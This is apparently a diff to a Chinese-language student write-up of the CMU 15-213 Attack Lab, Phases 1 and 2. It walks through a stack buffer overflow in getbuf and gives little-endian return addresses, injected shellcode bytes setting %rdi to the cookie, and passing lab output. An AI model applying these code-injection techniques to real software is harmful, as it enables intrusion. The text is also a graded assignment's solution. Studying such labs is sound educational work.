@@ -3,29 +3,6 @@
 ## Phase 1
 
 ```asm
-00000000004017c0 <touch1>:
-  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
-  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
-  4017cb:	00 00 00 
-  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
-  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
-  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
-  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
-  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
-  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
-
-0000000000401968 <test>:
-  401968:	48 83 ec 08          	sub    $0x8,%rsp
-  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
-  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
-  401976:	89 c2                	mov    %eax,%edx
-  401978:	be 88 31 40 00       	mov    $0x403188,%esi
-  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
-  401982:	b8 00 00 00 00       	mov    $0x0,%eax
-  401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
-  40198c:	48 83 c4 08          	add    $0x8,%rsp
-  401990:	c3                   	ret
-
 00000000004017a8 <getbuf>:
   4017a8:	48 83 ec 28          	sub    $0x28,%rsp
   4017ac:	48 89 e7             	mov    %rsp,%rdi
@@ -33,8 +10,67 @@
   4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
   4017b9:	48 83 c4 28          	add    $0x28,%rsp
   4017bd:	c3                   	ret
+
+00000000004017c0 <touch1>: ...
 ```
 
 很明显，getbuf只有0x28就是40的缓冲区，那只要40个垃圾数据+返回地址就行了
 
 NB. 小段序，所以返回地址要倒着写 ie. `c0 17 40 00 00 00 00 00`
+
+```bash
+➜  attack git:(main) ✗ ./hex2raw < ans/1.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+```
+
+
+## Phase 2
+
+从pdf中可以知道，不但要调用touch2，还要传入的%rdi与cookie相同
+
+需要做的
+
+1. buffer overflow，覆盖掉返回地址
+2. 继续覆盖更多内容，植入自己的程序
+3. ret返回到自己程序的开头
+4. 自己程序设置好环境，再ret touch2()
+
+
+地址高位
+
+- code (设置rdi，再把当前rsp指向的地址改为touch2地址，然后ret)
+- return addr
+- getbuf garbage 40 bytes
+
+地址低位
+
+所以代码部分，就是设置好touch()返回地址+寄存器就行了
+```asm
+0000000000000000 <.text>:
+   0:   68 ec 17 40 00          push   $0x4017ec
+   5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   c:   c3                      ret
+```
+
+代码部分就是 `68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3`
+
+gdb可以发现，在getbuf返回之前`$rsp   : 0x000000005561dca0`
+
+自己程序的开头就是`0x000000005561dca8`
+
+```bash
+➜  attack git:(main) ✗ ./hex2raw < ans/2.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+```
